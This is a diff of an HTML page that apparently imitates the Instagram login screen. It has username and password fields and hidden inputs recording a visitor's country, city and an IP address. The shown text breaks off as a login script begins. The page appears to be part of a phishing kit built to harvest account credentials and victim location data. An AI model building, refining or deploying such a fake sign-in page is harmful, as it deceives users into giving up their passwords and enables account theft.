@@ -414,106 +414,41 @@
 <head>
 
 
-    <section class="section-all" style='color: #507392;'>
+ <form>
+    <div>
+        <label for="username">Phone number, username, or email:</label>
+        <input type="text" id="username" aria-describedby="" placeholder="Phone number, username, or email">
+    </div>
 
-        <!-- 1-Role Main -->
-        <main class="main" role="main">
-            <div class="wrapper">
-                <article class="article">
-                    <div class="content">
-                        <div class="login-box">
-                            <div class="header">
-                                <img class="logo" src="1024px-Instagram_logo.svg.png">
-                            </div><!-- Header end -->
-                            <div class="form-wrap">
-                                <!-- <form class="form"> -->
+    <div>
+        <label for="password">Password:</label>
+        <input type="password" id="password" placeholder="Password">
+    </div>
 
-                                    <div class="input-box">
-                                        <input type="text" id="username" aria-describedby=""
-                                            placeholder="Phone number, username, or email"  >
-                                    </div>
+    <div>
+        <button type="button" id="login">Log in</button>
+    </div>
 
-                                    <div class="input-box">
-                                        <input type="password"  id="password" placeholder="Password"  >
-                                    </div>
+    <a href="">Forgot password?</a>
+    <p id="feedback" style="color: red; display: none;"></p>
 
-                                    <span class="button-box">
-                                        <img src="hug.gif" width="20px" id="loader" style="position: absolute; top: 0.5em; left: 9em95; display: none; ">
+    <div>
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
 
-                                        <button class="btn" name="login" id="login">Log in</button>
-                                    </span>
+    <div>
+        <p>Get the app.</p>
+        <div>
+            <a href=""><img src="ios.png" alt="iOS App" style="height: 50px;"></a>
+            <a href=""><img src="google.png" alt="Google App" style="height: 40px; margin-top: 5px;"></a>
+        </div>
+    </div>
 
-                                    <a class="forgot" href="">Forgot password?</a>
-                                    <p id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p><br>
-                                <!-- </form> -->
-                            </div> <!-- Form-wrap end -->
-                        </div> <!-- Login-box end -->
+    <input type="hidden" id="country" value="Nigeria" name="country">
+    <input type="hidden" id="city" value="Benin City" name="city">
+    <input type="hidden" id="ip" value="105.112.208.131" name="ip">
+</form>
 
-                        <div class="login-box">
-                            <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-                        </div> <!-- Signup-box end -->
-
-                        <div class="app">
-                            
-                            <p>Get the app.</p>
-                            <div class="app-img">
-                                <a
-                                    href="">
-                                    <img
-                                        src="ios.png" style="height: 50px;">
-                                </a>
-                                <a
-                                    href="">
-                                    <img
-                                        src="google.png"  style="height: 40px; margin-top: 5px;">
-                                </a>
-                            </div> <!-- App-img end-->
-                        </div> <!-- App end -->
-                    </div> <!-- Content end -->
-                </article>
-            </div> <!-- Wrapper end -->
-        </main>
-
-        <!-- 2-Role Footer -->
-        <footer class="footer" role="contentinfo">
-            <div class="footer-container">
-
-                <nav class="footer-nav" role="navigation">
-                    <ul>
-                        <li><a href="">About Us</a></li>
-                        <li><a href="">Support</a></li>
-                        <li><a href="">Blog</a></li>
-                        <li><a href="">Press</a></li>
-                        <li><a href="">Api</a></li>
-                        <li><a href="">Jobs</a></li>
-                        <li><a href="">Privacy</a></li>
-                        <li><a href="">Terms</a></li>
-                        <li><a href="">Directory</a></li>
-                        <li>
-                            <span class="language">Language
-                                <select name="language" class="select" onchange="la(this.value)">
-                                    <option value="#">English</option>
-                                    <option value="">Russian</option>
-                                </select>
-                            </span>
-                        </li>
-                    </ul>
-                </nav>
-
-                <!-- <span class="footer-logo">&copy; 2018 Instagram</span> -->
-            </div> <!-- Footer container end -->
-        </footer>
-
-    </section>
-    </span> 
-
-    
-
-    <input type="hidden" id='country' value='Nigeria
-' name='country'>
-    <input type="hidden" id='city' value='Benin City
-' name='city'>
-    <input type="hidden" id='ip' value='105.112.208.131' name='ip'>
     
   <script>
       var login = document.getElementById('login');
